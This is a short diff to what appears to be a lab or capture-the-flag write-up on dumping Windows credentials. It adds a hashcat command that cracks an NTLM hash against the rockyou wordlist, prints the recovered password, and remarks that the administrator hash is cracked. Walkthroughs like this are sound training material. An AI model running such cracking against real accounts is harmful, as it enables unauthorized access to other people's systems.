@@ -594,7 +594,13 @@ NL$KM:622a298df977ccddeeeb2320b2e2af590bf633e0955db003b10185559d16644d531f937bfb
 There is no plaintext LSA passwords
 
 ```python
+❯❯❯ hashcat -m 1000 'a29f7623fd11550def0192de9246f46b' /usr/share/wordlists/rockyou.txt
 
+a29f7623fd11550def0192de9246f46b:Password@123 
 ```
+
+The administrator accounts hash cracked
+
+
 
 
